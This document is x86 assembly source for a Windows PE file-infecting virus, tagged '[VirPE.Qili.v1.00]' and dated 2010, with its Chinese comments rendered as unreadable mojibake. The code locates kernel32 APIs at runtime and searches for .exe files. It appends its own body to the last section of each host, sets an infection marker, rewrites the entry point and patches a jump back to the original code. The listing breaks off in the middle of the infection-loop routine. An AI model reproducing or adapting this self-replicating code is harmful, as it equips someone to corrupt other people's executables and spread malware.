;-------------------------
; PE��������
; ���δ���ʹ���˽�������ӵ����һ�ڵķ���
; �����ܣ�ʵ�ִ���Ŀ¼�ķ������߱���������
; ���ߣ�����
; �������ڣ�2010.7.7
;-------------------------

    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc


VIR_TOTAL_SIZE       equ  offset vir_end-offset vir_start
INFECTFILES                 equ  03h                        ;��Ⱦ�ļ��ĸ���
DEFAULT_KERNEL_BASE         equ  07C800000h                 ;kernel32��Ĭ�ϻ���ַ
DEFAULT_KERNEL_BASEwNT      equ  077F00000h


_ProtoGetProcAddress  typedef proto :dword,:dword
_ProtoLoadLibrary     typedef proto :dword
_ProtoCreateDir       typedef proto :dword,:dword


_ApiGetProcAddress    typedef ptr _ProtoGetProcAddress
_ApiLoadLibrary       typedef ptr _ProtoLoadLibrary
_ApiCreateDir         typedef ptr _ProtoCreateDir

    .code
;����ӵ�Ŀ���ļ��Ĵ�������￪ʼ����vir_end������
vir_start equ this byte

jmp _NewEntry


szGetProcAddr  db  'GetProcAddress',0
szLoadLib      db  'LoadLibraryA',0
szCreateDir    db  'CreateDirectoryA',0   ;�÷�����kernel32.dll��
szDir          db  'c:\\BBBN',0           ;Ҫ������Ŀ¼


mark_                 db  '[VirPE.Qili.v1.00]',0 ;������ʶ
                      db  '(c)2010 Qili ShanDong',0
EXE_MASK              db  '*.exe',0
infections            dd  00000000h              ;��Ⱦ�ļ��ĸ���������ָ���������˳�
kernel                dd  DEFAULT_KERNEL_BASE

szFunNames        equ this byte            ;�������б�
szFindFirstFileA       db 'FindFirstFileA',0
szFindNextFileA        db 'FindNextFileA',0
szFindClose            db 'FindClose',0
szCreateFileA          db 'CreateFileA',0
szSetFilePointer       db 'SetFilePointer',0
szSetFileAttributesA   db 'SetFileAttributesA',0
szCloseHandle          db 'CloseHandle',0
szGetCurrentDirectoryA db 'GetCurrentDirectoryA',0
szSetCurrentDirectoryA db 'SetCurrentDirectoryA',0
szGetWindowsDirectoryA db 'GetWindowsDirectoryA',0
szGetSystemDirectoryA  db 'GetSystemDirectoryA',0
szCreateFileMappingA   db 'CreateFileMappingA',0
szMapViewOfFile        db 'MapViewOfFile',0
szUnmapViewOfFile      db 'UnmapViewOfFile',0
szSetEndOfFile         db 'SetEndOfFile',0
                       db 0bbh               ;������

                      dd  12345678h
newSize               dd  00000000h
searchHandle          dd  00000000h
fileHandle            dd  00000000h
mapHandle             dd  00000000h
mapAddress            dd  00000000h
addressTableVA        dd  00000000h
nameTableVA           dd  00000000h
ordinalTableVA        dd  78563412h
dwPatchCodeSize       dd  ?     ;���������С
dwNewFileSize         dd  ?     ;���ļ���С=Ŀ���ļ���С+���������С
dwNewPatchCodeSize    dd ?    ;�������밴8λ�����Ĵ�С
dwPatchCodeSegStart   dd ?   ;�����������ڽ����ļ��е���ʼ��ַ
dwSectionCount        dd ?   ;Ŀ���ļ��ڵĸ���
dwSections            dd ?   ;���нڱ��С
dwNewHeaders          dd ?   ;���ļ�ͷ�Ĵ�С
dwFileAlign           dd ?   ;�ļ���������
dwFirstSectionStart   dd ?   ;Ŀ���ļ���һ�ھ����ļ���ʼ��ƫ����
dwOff                 dd ?   ;���ļ���ԭ��������Ĳ���
dwValidHeadSize       dd ?   ;Ŀ���ļ�PEͷ����Ч���ݳ���
dwHeaderSize          dd ?   ;�ļ�ͷ����
dwBlock1              dd ?   ;ԭPEͷ����Ч���ݳ���+�����������Ч���ݳ���
dwPE_SECTIONSize      dd ?   ;PEͷ+�ڱ��С
dwSectionsLeft        dd ?   ;Ŀ���ļ����н����ݵĴ�С
dwNewSectionSize      dd ?   ;�����ӽڶ����ĳߴ�
dwNewSectionOff       dd ?   ;�����ӽ����������ļ��е�ƫ��
dwDstSizeOfImage      dd ?   ;Ŀ���ļ��ڴ�ӳ��Ĵ�С
dwNewSizeOfImage      dd ?   ;�����ӵĽ����ڴ�ӳ���еĴ�С
dwNewFileAlignSize    dd ?   ;�ļ������Ĵ�С
dwSectionsAlignLeft   dd ?   ;Ŀ���ļ������ļ��ж����Ĵ�С
dwLastSectionAlignSize  dd ?   ;Ŀ���ļ����һ�ڶ��������մ�С����������
dwLastSectionStart      dd ?   ;Ŀ���ļ����һ�����ļ��е�ƫ��
dwSectionAlign          dd ?   ;�ڶ�������
dwVirtualAddress        dd ?   ;���һ�ڵ���ʼRVA
dwEIPOff                dd ?   ;��EIPָ��;�EIPָ��ľ���



dwDstEntryPoint      dd ?   ;�ɵ���ڵ�ַ
dwNewEntryPoint      dd ?   ;�µ���ڵ�ַ

lpFunAddress         equ this byte          ;������ַ�б�
_FindFirstFileA       dd  00000000h
_FindNextFileA        dd  00000000h
_FindClose            dd  00000000h
_CreateFileA          dd  00000000h
_SetFilePointer       dd  00000000h
_SetFileAttributesA   dd  00000000h
_CloseHandle          dd  00000000h
_GetCurrentDirectoryA dd  00000000h
_SetCurrentDirectoryA dd  00000000h
_GetWindowsDirectoryA dd  00000000h
_GetSystemDirectoryA  dd  00000000h
_CreateFileMappingA   dd  00000000h
_MapViewOfFile        dd  00000000h
_UnmapViewOfFile      dd  00000000h
_SetEndOfFile         dd  00000000h

MAX_PATH         equ 260


WIN32_FIND_DATA1  equ this byte
 WFD_dwFileAttributes   dd  ?
 WFD_ftCreationTime     FILETIME <?>
 WFD_ftLastAccessTime   FILETIME <?>
 WFD_ftLastWriteTime    FILETIME <?>
 WFD_nFileSizeHigh      dd  ?
 WFD_nFileSizeLow       dd  ?
 WFD_dwReserved0        dd  ?
 WFD_dwReserved1        dd  ?
 WFD_szFileName         db  MAX_PATH dup(?)
 WFD_szAlternateFileName db 13 dup(?)
                         db 03 dup (?)
directories     equ this byte
OriginDir               db   7Fh dup (0)           ;Ӧ�ó������ڵ�Ŀ¼

dwDirectoryCount        equ (($-directories)/7Fh)
mirrormirror            db  dwDirectoryCount       ;Ŀ¼����



;-----------------------------
; ���� Handler
;-----------------------------------------
_SEHHandler proc _lpException,_lpSEH,_lpContext,_lpDispatcher
  pushad
  mov esi,_lpException
  mov edi,_lpContext
  assume esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT
  mov eax,_lpSEH
  push [eax+0ch]
  pop [edi].regEbp
  push [eax+8]
  pop [edi].regEip
  push eax
  pop [edi].regEsp
  assume esi:nothing,edi:nothing
  popad
  mov eax,ExceptionContinueExecution
  ret
_SEHHandler endp

;-----------------------------
; ����
; ��ڣ�eax----�����ֵ
;       ecx----��������
; ���ڣ�eax----�����Ժ��ֵ
;-----------------------------
_align       proc
    push edx

    xor edx,edx
    div ecx
    .if edx>0
      inc eax
    .endif
    xor edx,edx
    mul ecx
    pop edx
    ret
_align       endp
;------------------------------------
; ����kernel32.dll�е�һ����ַ��ȡ���Ļ���ַ
;------------------------------------
_getKernelBase  proc _dwKernelRetAddress
   local @dwRet

   pushad

   mov @dwRet,0
   
   mov edi,_dwKernelRetAddress
   and edi,0ffff0000h  ;����ָ������ҳ�ı߽磬��1000h����

   .repeat
     .if word ptr [edi]==IMAGE_DOS_SIGNATURE  ;�ҵ�kernel32.dll��dosͷ
        mov esi,edi
        add esi,dword ptr [esi+003ch]
        .if word ptr [esi]==IMAGE_NT_SIGNATURE ;�ҵ�kernel32.dll��PEͷ��ʶ
          mov @dwRet,edi
          .break
        .endif
     .endif
     sub edi,010000h
     .break .if edi<070000000h
   .until FALSE
   popad
   mov eax,@dwRet
   ret
_getKernelBase  endp   

;-------------------------------
; ��ȡָ���ַ�����API�����ĵ��õ�ַ
; ��ڲ�����_hModuleΪ��̬���ӿ�Ļ�ַ��_lpApiΪAPI����������ַ
; ���ڲ�����eaxΪ�����������ַ�ռ��е���ʵ��ַ
;-------------------------------
_getApi proc _hModule,_lpApi
   local @ret
   local @dwLen

   pushad
   mov @ret,0
   ;����API�ַ����ĳ��ȣ���������
   mov edi,_lpApi
   mov ecx,-1
   xor al,al
   cld
   repnz scasb
   mov ecx,edi
   sub ecx,_lpApi
   mov @dwLen,ecx

   ;��pe�ļ�ͷ������Ŀ¼��ȡ�������ַ
   mov esi,_hModule
   add esi,dword ptr [esi+3ch]
   assume esi:ptr IMAGE_NT_HEADERS
   mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
   add esi,_hModule
   assume esi:ptr IMAGE_EXPORT_DIRECTORY

   ;���ҷ������Ƶĵ���������
   mov ebx,[esi].AddressOfNames
   add ebx,_hModule
   xor edx,edx
   .repeat
     push esi
     mov edi,[ebx]
     add edi,_hModule
     mov esi,_lpApi
     mov ecx,@dwLen
     repz cmpsb
     .if ZERO?
       pop esi
       jmp @F
     .endif
     pop esi
     add ebx,4
     inc edx
   .until edx>=[esi].NumberOfNames
   jmp _ret
@@:
   ;ͨ��API����������ȡ��������ٻ�ȡ��ַ����
   sub ebx,[esi].AddressOfNames
   sub ebx,_hModule
   shr ebx,1
   add ebx,[esi].AddressOfNameOrdinals
   add ebx,_hModule
   movzx eax,word ptr [ebx]
   shl eax,2
   add eax,[esi].AddressOfFunctions
   add eax,_hModule
   
   ;�ӵ�ַ��õ����������ĵ�ַ
   mov eax,[eax]
   add eax,_hModule
   mov @ret,eax

_ret:
   assume esi:nothing
   popad
   mov eax,@ret
   ret
_getApi endp

;---------------------
; ��ȡ���е�API��ڵ�ַ
;---------------------
_getAllAPIs           proc
     pushad
     call @F   ; ��ȥ�ض�λ
@@:
     pop ebx
     sub ebx,offset @B   ;��λ����ַebx            
     mov ebp,ebx
       
     .repeat
       push esi
       mov eax,[ebx+kernel]
       push eax
       call _getApi
       mov dword ptr [edi],eax
       ;�޸�esi��ֵָ����һ��������
       mov al,byte ptr [esi]
       .break .if al==0BBh
       .repeat
         mov al,byte ptr [esi]
         .if al==0
           inc esi
           .break
         .endif
         inc esi
       .until FALSE

       ;�޸�edi��ֵָ����һ����ַ
       add edi,4
     .until FALSE
     popad
     ret
_getAllAPIs           endp


;----------------------------------------
; ��ȡ�ڵĸ���
;----------------------------------------
_getSectionCount  proc _lpFileHead
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  movzx ecx,[esi].FileHeader.NumberOfSections
  mov @dwReturn,ecx
  popad
  mov eax,@dwReturn
  ret
_getSectionCount endp

;----------------------------------------
; ��ȡ�ļ��Ķ�������
;----------------------------------------
getSectionAlign  proc _lpFileHead
  local @ret
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  mov ecx,[esi].OptionalHeader.SectionAlignment  
  mov @ret,ecx
  popad
  mov eax,@ret
  ret
getSectionAlign  endp

;---------------------
; ���ļ�ƫ��ת��Ϊ�ڴ�ƫ����RVA
; lp_FileHeadΪ�ļ�ͷ����ʼ��ַ
; _dwOffΪ�������ļ�ƫ�Ƶ�ַ
;---------------------
_OffsetToRVA proc _lpFileHead,_dwOffset
  local @dwReturn
  
  pushad

  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwOffset
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].PointerToRawData
    add eax,[edx].SizeOfRawData    ;����ýڽ���RVA
    .if (edi>=[edx].PointerToRawData)&&(edi<eax)
      mov eax,[edx].PointerToRawData
      sub edi,eax                ;����RVA�ڽ��е�ƫ��
      mov eax,[edx].VirtualAddress
      add eax,edi                ;���Ͻ����ڴ��е���ʼλ��
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,-1
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_OffsetToRVA endp
;---------------------
; ���ڴ�ƫ����RVAת��Ϊ�ļ�ƫ��
;---------------------
_RVAToOffset proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,[edx].VirtualAddress
      sub edi,eax                ;����RVA�ڽ��е�ƫ��
      mov eax,[edx].PointerToRawData
      add eax,edi                ;���Ͻ����ļ��еĵ���ʼλ��
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,-1
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_RVAToOffset endp

;----------------------------------------
; ��ȡ�½ڵ�RVA��ַ
;----------------------------------------
_getNewSectionRVA  proc _lpFileHead
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,esi
  add edi,sizeof IMAGE_NT_HEADERS
  assume edi:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections

  
  xor edx,edx
  mov eax,ecx
  dec eax
  mov bx,sizeof IMAGE_SECTION_HEADER
  mul bx
  add edi,eax       ;��λ�����һ���ڶ��崦
  assume edi:ptr IMAGE_SECTION_HEADER
  mov eax,[edi].SizeOfRawData
  xor edx,edx
  mov bx,1000h
  div bx
  .if edx!=0
    inc eax
  .endif
  xor edx,edx
  mul bx
  mov ebx,eax

  mov eax,[edi].VirtualAddress
  add eax,ebx

  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getNewSectionRVA endp



;------------------------
; ��ȡRVA���ڽڵ�����
;------------------------
_getRVASectionName  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,edx
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,0
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionName  endp

;------------------------
; ��ȡRVA���ڽڵ��ļ���ʼ��ַ
;------------------------
_getRVASectionStart  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,[edx].PointerToRawData
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,0
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionStart  endp

;------------------------
; ��ȡRVA���ڽڵ�ԭʼ��С
;------------------------
_getRVASectionSize  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      ;invoke _appendInfo,edx
      mov eax,[edx].Misc
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,0
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionSize  endp
;-------------------
; ȡ�������ڽڵĴ�С
; ����ڶ�λ������
; ��ڵ�ַָ���RVA���ڵĽ�
; _lpHeaderָ���ڴ���PE�ļ�����ʼ
; ����ֵ��eax��
;-------------------
getCodeSegSize proc _lpHeader
   local @dwSize
   pushad
   
   mov esi,_lpHeader
   assume esi:ptr IMAGE_DOS_HEADER
   add esi,[esi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
   assume esi:ptr IMAGE_NT_HEADERS
   mov eax,[esi].OptionalHeader.AddressOfEntryPoint

   invoke _getRVASectionSize,_lpHeader,eax
   mov @dwSize,eax   
   popad
   mov eax,@dwSize
   ret
getCodeSegSize endp

;-------------------
; ȡ�����������ڽڵĴ�С
; _lpHeaderָ���ڴ���PE�ļ�����ʼ
; ����ֵ��eax��
;-------------------
getCodeSegStart proc _lpHeader
   local @dwStart
   pushad
   
   mov esi,_lpHeader
   assume esi:ptr IMAGE_DOS_HEADER
   add esi,[esi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
   assume esi:ptr IMAGE_NT_HEADERS
   mov eax,[esi].OptionalHeader.AddressOfEntryPoint
   invoke _getRVASectionStart,_lpHeader,eax
   mov @dwStart,eax   
   popad
   mov eax,@dwStart
   ret
getCodeSegStart endp

;-------------------------
; ��ȡ�������
;-------------------------
getEntryPoint  proc  _lpFile
   local @ret
   pushad
   mov edi,_lpFile
   assume edi:ptr IMAGE_DOS_HEADER

   add edi,[edi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
   assume edi:ptr IMAGE_NT_HEADERS
   ;ȡԴ����װ�ص�ַ
   add edi,4
   add edi,sizeof IMAGE_FILE_HEADER
   assume edi:ptr IMAGE_OPTIONAL_HEADER32
   mov eax,[edi].AddressOfEntryPoint
   mov @ret,eax
   popad
   mov eax,@ret
   ret
getEntryPoint endp


;------------------------
; ��ȡRVA���ڽ����ļ��ж����Ժ�Ĵ�С
;------------------------
_getRVASectionRawSize  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,[edx].SizeOfRawData
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,0
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionRawSize  endp

_getRVACount  proc _lpFileHead
  local @ret
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  movzx ecx,[esi].FileHeader.NumberOfSections  
  mov @ret,ecx
  popad
  mov eax,@ret
  ret
_getRVACount endp

;------------------------------------
; ��ȡ���һ�ڵ����ļ���ƫ��
;-------------------------------------
getLastSectionStart proc _lpFileHead
  local @ret
  pushad
  invoke _getRVACount,_lpFileHead
  xor edx,edx
  dec eax
  mov ecx,28h
  mul ecx

  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  add esi,sizeof IMAGE_NT_HEADERS  
  add esi,eax
  assume esi:ptr IMAGE_SECTION_HEADER
  mov eax,[esi].PointerToRawData
  mov @ret,eax
  popad
  mov eax,@ret
  ret
getLastSectionStart endp

getFileAlign  proc _lpFileHead
  local @ret
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  mov ecx,[esi].OptionalHeader.FileAlignment  
  mov @ret,ecx
  popad
  mov eax,@ret
  ret
getFileAlign  endp
;-----------------------------
; ���ļ�
; ��ڣ�ecx----Ҫ��ȡ���ļ���С
; ���ڣ���
;-----------------------------         
truncFile       proc
    xor eax,eax
    push eax
    push eax
    push ecx
    push dword ptr [ebx+fileHandle]
    call [ebx+_SetFilePointer]
    push dword ptr [ebx+fileHandle]
    call [ebx+_SetEndOfFile]
    ret
truncFile       endp

;------------------------------
; ���ļ�
; ��ڣ�esi--ָ��Ҫ�򿪵��ļ�������
; ���ڣ�eax--����ɹ����ļ������ʧ������-1
;------------------------------    
openFile        proc
    xor eax,eax
    push eax
    push eax
    push 0000003h
    push eax
    inc eax
    push eax
    push 80000000h or 40000000h
    push esi
    call [ebx+_CreateFileA]
    ret
openFile        endp

;-----------------------------------
; ����ӳ��
; ��ڣ�ecx---ӳ���С
; ���ڣ�eax---�ɹ�Ϊӳ����
;-----------------------------------    
createMap      proc
    xor eax,eax
    push eax
    push ecx
    push eax
    push 000000004h
    push eax
    push dword ptr [ebx+fileHandle]
    call [ebx+_CreateFileMappingA]
    ret
createMap      endp

;-------------------------------------
; ӳ���ļ������̵�ַ�ռ�
; ��ڣ�ecx----Ҫӳ��ĳߴ�
; ���ڣ�eax----�ɹ��򷵻ص�ַ
;-------------------------------------  
mapFile        proc
    xor eax,eax
    push ecx
    push eax
    push eax
    push 00000002h
    push dword ptr [ebx+mapHandle]
    call [ebx+_MapViewOfFile]
    ret
mapFile        endp

;---------------------------------
;   ָ����Ⱦ�ļ�
;---------------------------------
_infect proc
    ;��ȡ�ļ���������ļ�����
    lea esi,[ebx+WFD_szFileName]
    push 80h
    push esi
    call [ebx+_SetFileAttributesA]
    call openFile
    inc eax  ;���eax=-1������ļ�����
    jz cannotOpen
    dec eax
    mov dword ptr [ebx+fileHandle],eax
    mov ecx,dword ptr [ebx+WFD_nFileSizeLow]
    call createMap   ;����ӳ���ļ�
    or eax,eax
    jz closeFile
    mov dword ptr [ebx+mapHandle],eax
    ;ӳ���ļ����ڴ�
    mov ecx,dword ptr [ebx+WFD_nFileSizeLow]
    call mapFile
    or eax,eax
    jz unMapFile
    mov dword ptr [ebx+mapAddress],eax

   

    ;��ʼ�����ļ����ж��ļ��Ƿ�Ϊ�Ϸ�PE�ļ�
    mov esi,[eax+3ch]
    add esi,eax
    cmp dword ptr [esi],"EP"        ;�Ƚ��Ƿ�Ϊ��PE��
    jnz noInfect

    push esi
    mov esi,dword ptr [ebx+mapAddress]
    add esi,4
    mov eax,dword ptr [esi]
    pop esi

    cmp eax,"iliq"  ;�Ƚ��Ƿ񱻴���� 
    jz noInfect

    push dword ptr [esi+3ch]        ;�����ļ�����
    pop ecx                         ;�ָ��ļ�����   

 
    mov eax,VIR_TOTAL_SIZE
    mov dword ptr [ebx+dwPatchCodeSize],eax


    ;���ļ���С�����ļ��������ȶ���
    invoke getFileAlign,[ebx+mapAddress]
    mov dword ptr [ebx+dwFileAlign],eax
    xchg eax,ecx
    mov eax,dword ptr [ebx+WFD_nFileSizeLow]
    invoke _align
    mov dword ptr [ebx+dwNewFileAlignSize],eax    

    ;�����һ�����ļ��е�ƫ��
    invoke getLastSectionStart,[ebx+mapAddress]
    mov dword ptr [ebx+dwLastSectionStart],eax
  
    ;�����һ�ڴ�С
    mov eax,dword ptr [ebx+dwNewFileAlignSize]
    sub eax,dword ptr [ebx+dwLastSectionStart]
    add eax,dword ptr [ebx+dwPatchCodeSize]
    ;����ֵ�����ļ��������ȶ���
    mov ecx,dword ptr [ebx+dwFileAlign]
    invoke _align
    mov dword ptr [ebx+dwLastSectionAlignSize],eax

    ;�����ļ���С
    mov eax,dword ptr [ebx+dwLastSectionStart]
    add eax,dword ptr [ebx+dwLastSectionAlignSize]
    mov dword ptr [ebx+dwNewFileSize],eax

    ;�ر��ڴ�ӳ��
    pushad
    push dword ptr [ebx+mapAddress]
    call [ebx+_UnmapViewOfFile]
    push dword ptr [ebx+mapHandle]
    call [ebx+_CloseHandle]
    popad


    ;���³ߴ�����ӳ���ļ�
    mov dword ptr [ebx+newSize],eax
    xchg ecx,eax
    call createMap
    or eax,eax
    jz closeFile
    mov dword ptr [ebx+mapHandle],eax
    mov ecx,dword ptr [ebx+newSize]
    call mapFile
    or eax,eax
    jz unMapFile
    mov dword ptr [ebx+mapAddress],eax

    ;����

    ;����SizeOfRawData
    invoke _getRVACount,[ebx+mapAddress]
    xor edx,edx
    dec eax
    mov ecx,sizeof IMAGE_SECTION_HEADER
    mul ecx

    mov edi,dword ptr [ebx+mapAddress]
    assume edi:ptr IMAGE_DOS_HEADER
    add edi,[edi].e_lfanew
    mov esi,edi
    assume esi:ptr IMAGE_NT_HEADERS
    add edi,sizeof IMAGE_NT_HEADERS  
    add edi,eax
    assume edi:ptr IMAGE_SECTION_HEADER
    mov eax,dword ptr [ebx+dwLastSectionAlignSize]
    mov [edi].SizeOfRawData,eax

    ;����Miscֵ
    invoke getSectionAlign,[ebx+mapAddress]
    mov dword ptr [ebx+dwSectionAlign],eax
    xchg eax,ecx
    mov eax,dword ptr [ebx+dwLastSectionAlignSize]
    invoke _align
    mov [edi].Misc,eax

    ;�޸ı�־
    or dword ptr [edi].Characteristics,0A0000020h;���Ľڵı�־
    push esi
    mov esi,dword ptr [ebx+mapAddress]
    add esi,4
    mov dword ptr [esi],"iliq"  ;���ò�����־
    pop esi

    ;����VirtualAddress
    mov eax,[edi].VirtualAddress  ;ȡԭʼRVAֵ
    mov dword ptr [ebx+dwVirtualAddress],eax

    ;����������ڵ�ַ  
    mov eax,dword ptr [ebx+dwNewFileAlignSize]
    invoke _OffsetToRVA,[ebx+mapAddress],eax
    mov dword ptr [ebx+dwNewEntryPoint],eax
    mov edi,dword ptr [ebx+mapAddress]
    assume edi:ptr IMAGE_DOS_HEADER
    add edi,[edi].e_lfanew    
    assume edi:ptr IMAGE_NT_HEADERS
    mov eax,[edi].OptionalHeader.AddressOfEntryPoint
    mov dword ptr [ebx+dwDstEntryPoint],eax
    mov eax,dword ptr [ebx+dwNewEntryPoint]
    mov [edi].OptionalHeader.AddressOfEntryPoint,eax
  
    mov eax,dword ptr [ebx+dwDstEntryPoint]
    sub eax,dword ptr [ebx+dwNewEntryPoint]
    mov dword ptr [ebx+dwEIPOff],eax

    ;����SizeOfImage
    mov eax,dword ptr [ebx+dwLastSectionAlignSize]
    mov ecx,dword ptr [ebx+dwSectionAlign]
    invoke _align
    ;��ȡ���һ���ڵ�VirtualAddress
    add eax,dword ptr [ebx+dwVirtualAddress]
    mov [edi].OptionalHeader.SizeOfImage,eax  

    ;������������
    lea esi,[ebx+vir_start]
    mov edi,dword ptr [ebx+mapAddress]
    add edi,dword ptr [ebx+dwNewFileAlignSize]

    mov ecx,dword ptr [ebx+dwPatchCodeSize]
    rep movsb
  
    ;�������������е�E9ָ���Ĳ�����  
    mov eax,dword ptr [ebx+mapAddress]
    add eax,dword ptr [ebx+dwNewFileAlignSize]
    add eax,dword ptr [ebx+dwPatchCodeSize]

    
    sub eax,5   ;EAXָ����E9�Ĳ�����
    mov edi,eax

    sub eax,dword ptr [ebx+mapAddress]
    add eax,4

    nop
    mov ecx,dword ptr [ebx+dwDstEntryPoint]
    invoke _OffsetToRVA,[ebx+mapAddress],eax
    sub ecx,eax
    mov dword ptr [edi],ecx
    inc byte ptr [ebx+infections]   ;���Ӽ������������ָ���������򷵻�
    jmp unMapFile                   ;�������ӵ�ģ��׷�ӵ��ļ�β��

noInfect:
    ;����޸�ʧ�ܣ���ָ�ԭ�ļ�������������1
    dec byte ptr [ebx+infections]
    mov ecx,dword ptr [ebx+WFD_nFileSizeLow]
    call truncFile
unMapFile:
    push dword ptr [ebx+mapAddress]
    call [ebx+_UnmapViewOfFile]
closeMap:
    push dword ptr [ebx+mapHandle]
    call [ebx+_CloseHandle]
closeFile:
    push dword ptr [ebx+fileHandle]
    call [ebx+_CloseHandle]
cannotOpen:
    ;�����ļ�ԭ�ȵ�����
    push dword ptr [ebx+WFD_dwFileAttributes]
    lea eax,[ebx+WFD_szFileName]
    push eax
    call [ebx+_SetFileAttributesA]

    ret
_infect    endp

;-----------------------------
; ��5���ļ����и�Ⱦ
;-----------------------------
_infectIt  proc
    ;�����ҵ���һ�������������ļ�
    and dword ptr [ebx+infections],00000000h   ;��������
